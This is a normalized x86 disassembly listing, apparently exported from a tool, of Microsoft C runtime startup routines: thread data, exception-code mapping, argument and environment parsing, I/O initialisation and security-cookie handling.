jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp [ ecx ] 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
or eax 0xffffffff
pop ebx
jmp r-xdata
cmp [ ecx ] 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp [ ecx ] 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_4045b1
push 0x8
push r--data
call sub_405550
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_405595
retn 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
push [ esi + 0x24 ]
call sub_404081
pop ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x2c ]
call sub_404081
pop ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0x34 ]
call sub_404081
pop ecx
cmp [ esi + 0x40 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call sub_404081
pop ecx
cmp [ esi + 0x44 ] 0x0
je r-xdata
push [ esi + 0x40 ]
call sub_404081
pop ecx
cmp [ esi + 0x48 ] 0x0
je r-xdata
push [ esi + 0x44 ]
call sub_404081
pop ecx
cmp [ esi + 0x5c ] r--data
je r-xdata
push [ esi + 0x48 ]
call sub_404081
pop ecx
push 0xd
call sub_406fa9
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push [ esi + 0x5c ]
call sub_404081
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4046d3
push 0xc
call sub_406fa9
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4046df
push esi
call sub_404081
pop ecx
push edi
call sub_4073eb
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_404081
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_407291
pop ecx
sub_404700
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_406cb2
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x3bc
push 0x1
call sub_407122
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
call sub_406cd1
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_404081
pop ecx
xor esi esi
push 0x0
push esi
call sub_40476f
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_40476f
push 0x8
push r--data
call sub_405550
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
push 0x43
pop eax
mov [ esi + 0xb8 ] ax
mov [ esi + 0x1be ] ax
mov [ esi + 0x68 ] rw-data
and [ esi + 0x3b8 ] 0x0
push 0xd
call sub_406fa9
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404810
push 0xc
call sub_406fa9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_407201
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404819
call sub_405595
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_404822
call sub_4049dc
call sub_4070d8
test eax eax
jne r-xdata
push sub_4045b1
call sub_406c75
pop ecx
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call sub_404898
xor eax eax
retn
push esi
push 0x3bc
push 0x1
call sub_407122
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_404898
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call sub_406cd1
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push esi
call sub_40476f
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_4048b5
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
leave
retn
push r--data
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_404937
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_407ecb
push r--data
push r--data
call sub_404a30
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_407ca0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_405498
call sub_407eb6
pop ecx
mov esi r--data
mov edi r--data
jmp r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
add esi 0x4
call eax
xor eax eax
push rw-data
call sub_407ca0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_4049dc
push esi
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
push esi
call sub_405929
push esi
call sub_405a59
push esi
call sub_407eea
push esi
call sub_407ef7
push esi
call sub_407f11
push esi
call sub_406c64
add esp 0x18
pop esi
jmp sub_406d31
sub_404a14
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_404a30
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_404a64
push 0x1c
push r--data
call sub_405550
push 0x8
call sub_406fa9
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404b7e
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_405595
retn
mov [ rw-data ] 0x1
push 0x8
call sub_40710d
pop ecx
push [ ebp + 0x8 ]
call sub_4048e7
push r--data
push r--data
call sub_404a14
pop ecx
pop ecx
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
push r--data
push r--data
call sub_404a14
pop ecx
pop ecx
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] edi
push 0x0
call [ EncodePointer@IAT ]
cmp [ edi ] eax
je r-xdata
sub edi 0x4
mov [ ebp - 0x24 ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
push [ edi ]
call esi
mov esi eax
push 0x0
call [ EncodePointer@IAT ]
mov [ edi ] eax
call esi
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
call esi
mov ecx [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x1c ] ecx
mov ebx ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x20 ] eax
mov edi eax
jmp r-xdata
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x24 ] edi
sub_404ba7
push 0x3
call sub_40539e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_404c04
push 0xff
call sub_404c04
pop ecx
pop ecx
push 0x3
call sub_40539e
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_404be0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_404c04
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_404be0
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_404072
leave
retn
push ebx
push 0x3
call sub_40539e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x3
call sub_40539e
pop ecx
test eax eax
jne r-xdata
pop ebx
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor ebx ebx
mov ecx ebx
push r--data
push 0x314
push rw-data
call sub_4042aa
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_408120
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc ecx
cmp ecx 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_405aa1
int3
push 0x104
push rw-data
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi 0x2fb
test eax eax
jne r-xdata
mov al [ edi + ecx * 2 ]
mov [ ebp + ecx - 0x1f8 ] al
cmp [ edi + ecx * 2 ] bx
je r-xdata
push rw-data
call sub_4081ab
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push esi
push rw-data
call sub_4042aa
add esp 0xc
test eax eax
jne r-xdata
push r--data
push 0x314
mov esi rw-data
push esi
call sub_40423e
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_4081ab
lea ecx [ eax * 2 + rw-data ]
mov eax ecx
sub eax rw-data
push 0x3
sar eax 0x1
push r--data
sub esi eax
push esi
push ecx
call sub_4081c4
add esp 0x14
test eax eax
jne r-xdata
push edi
push 0x314
push esi
call sub_40423e
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push esi
call sub_408282
add esp 0xc
jmp r-xdata
sub_404dd5
push 0x64
push r--data
call sub_405550
push 0xb
call sub_406fa9
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x40
push 0x20
pop edi
push edi
call sub_407122
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_408470
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x42 ] 0x0
je r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov al [ ecx + 0x24 ]
and al 0x7f
mov [ ecx + 0x24 ] al
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
jmp r-xdata
call sub_405595
retn
mov [ ebp - 0x2c ] ebx
cmp ebx 0x3
jge r-xdata
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40507a
xor eax eax
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0xffffffff
je r-xdata
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
add eax 0x4
mov [ ebp - 0x28 ] eax
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax 0x800
cmp ecx eax
jl r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp [ esi ] 0xfffffffe
je r-xdata
xor esi esi
inc esi
mov [ ebp - 0x30 ] esi
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x80
mov [ esi + 0x4 ] al
jmp r-xdata
mov edi ebx
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
push 0x40
push edi
call sub_407122
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
mov [ esi + 0x4 ] al
mov [ esi ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
jmp r-xdata
mov esi [ edx ]
cmp esi 0xffffffff
je r-xdata
mov [ esi * 4 + rw-data ] ecx
add [ rw-data ] edi
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ eax + ebx * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc edi
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
add edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp esi 0xfffffffe
je r-xdata
inc esi
mov [ ebp - 0x30 ] esi
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
cmp edi ecx
jge r-xdata
mov al [ eax ]
test al 0x1
je r-xdata
cmp [ rw-data ] ecx
jge r-xdata
mov eax [ esi * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
cmp eax 0x3
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
jmp r-xdata
test al 0x8
jne r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x8
mov [ esi + 0x4 ] al
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] esi
mov eax [ edx ]
mov [ esi ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
mov edx [ ebp - 0x20 ]
push esi
call [ GetFileType@IAT ]
mov edx [ ebp - 0x20 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub_405083
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push esi
push edi
push 0x104
mov edi rw-data
xor ebx ebx
push edi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov esi [ rw-data ]
mov [ rw-data ] edi
test esi esi
je r-xdata
call sub_40754d
mov esi edi
cmp [ esi ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x8 ]
cmp ecx 0xffffffff
jae r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push esi
call sub_405134
mov ebx [ ebp - 0x4 ]
add esp 0x14
cmp ebx 0x3fffffff
jae r-xdata
lea edx [ ecx + ebx * 4 ]
cmp edx ecx
jb r-xdata
push edx
call sub_40716c
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + ebx * 4 ]
push eax
push edi
push esi
call sub_405134
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] eax
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_405134
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
and [ ebx ] 0x0
mov esi [ ebp + 0x8 ]
mov [ eax ] 0x1
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test eax eax
je r-xdata
xor ecx ecx
mov [ ebp + 0x8 ] ecx
mov [ eax ] edi
add eax 0x4
mov [ ebp + 0xc ] eax
inc [ ebx ]
test edi edi
je r-xdata
xor eax eax
test ecx ecx
sete al
inc esi
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov al 0x22
jmp r-xdata
mov al [ esi ]
mov [ ebp + 0x1b ] al
movzx eax al
push eax
inc esi
call sub_40878e
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
test ecx ecx
jne r-xdata
mov al [ ebp + 0x1b ]
test al al
je r-xdata
inc [ ebx ]
test edi edi
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x20
je r-xdata
dec esi
mov ecx [ ebp + 0x8 ]
inc esi
mov al [ esi ]
mov [ edi ] al
inc edi
test edi edi
je r-xdata
cmp al 0x9
jne r-xdata
mov edx [ ebp + 0xc ]
pop edi
pop esi
pop ebx
test edx edx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
and [ ebp + 0x18 ] 0x0
mov [ edi - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
pop ebp
retn
and [ edx ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov [ edx ] edi
add edx 0x4
mov [ ebp + 0xc ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test cl 0x1
jne r-xdata
dec ecx
test edi edi
je r-xdata
mov al [ esi ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
inc [ ebx ]
mov [ edi ] 0x5c
inc edi
test edi edi
je r-xdata
cmp [ ebp + 0x18 ] ecx
jne r-xdata
xor eax eax
xor edx edx
cmp [ ebp + 0x18 ] eax
sete al
mov [ ebp + 0x18 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ ebx ]
jmp r-xdata
mov [ edi ] 0x0
inc edi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
call sub_40878e
pop ecx
test edi edi
je r-xdata
cmp al 0x9
je r-xdata
xor edx edx
inc edx
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ ebx ]
inc esi
inc [ ebx ]
mov al [ esi ]
mov [ edi ] al
inc edi
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
inc [ ebx ]
sub_4052b0
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_40754d
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ edi + 0x1 ]
push 0x4
push eax
call sub_407122
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_408120
inc esi
pop ecx
add esi eax
inc edi
mov esi [ rw-data ]
push ebx
cmp [ esi ] 0x0
je r-xdata
push esi
call sub_404081
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
push esi
call sub_408120
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
add esi ebx
cmp [ esi ] 0x0
jne r-xdata
push 0x1
push ebx
call sub_407122
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
mov esi [ rw-data ]
push [ rw-data ]
call sub_404081
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_4087a4
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_405aa1
int3
add edi 0x4
sub_40539e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
or eax 0xffffffff
pop ebp
retn
cmp eax 0x2
jle r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_4053de
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
xor ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
leave
retn
sub_405478
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_405498
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_4054b8
push ebp
mov ebp esp
push ecx
push edi
call [ GetEnvironmentStringsW@IAT ]
mov edi eax
xor eax eax
test edi edi
je r-xdata
pop edi
leave
retn
push esi
mov esi edi
cmp [ edi ] ax
je r-xdata
push ebx
push eax
push eax
push eax
sub esi edi
push eax
sar esi 0x1
inc esi
push esi
push edi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add esi 0x2
cmp [ esi ] ax
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_40716c
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
add esi 0x2
cmp [ esi ] ax
jne r-xdata
xor eax eax
push eax
push eax
push [ ebp - 0x4 ]
push ebx
push esi
push edi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebx
call sub_404081
pop ecx
xor ebx ebx
pop ebx
pop esi
sub_405550
push sub_4055b0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_4055b0
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x8 ]
xor edi [ rw-data ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
mov eax [ edi ]
lea esi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_404072
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_404072
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebx - 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_4085ab
lea eax [ eax + eax * 2 ]
lea eax [ eax + 0x4 ]
mov ecx [ edi + eax * 4 + 0x4 ]
mov ebx [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x10 ] eax
test ecx ecx
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
add ecx esi
xor ecx [ edx + esi ]
call sub_404072
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_404072
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_408562
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_408592
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ eax + 0xc ] edx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push esi
mov ecx eax
call sub_4085ab
mov eax [ ebp + 0xc ]
push rw-data
call sub_407ca0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_404072
mov ecx [ ebp - 0x10 ]
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_408579
int3
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call [ rw-data ]
add esp 0x8
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_404072
sub_405745
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_4087f9
push [ ebp + 0x8 ]
call sub_406f93
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0xc0000409
call sub_406f7e
pop ecx
pop ebp
retn
push 0x1
call sub_4087f9
pop ecx
sub_405782
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
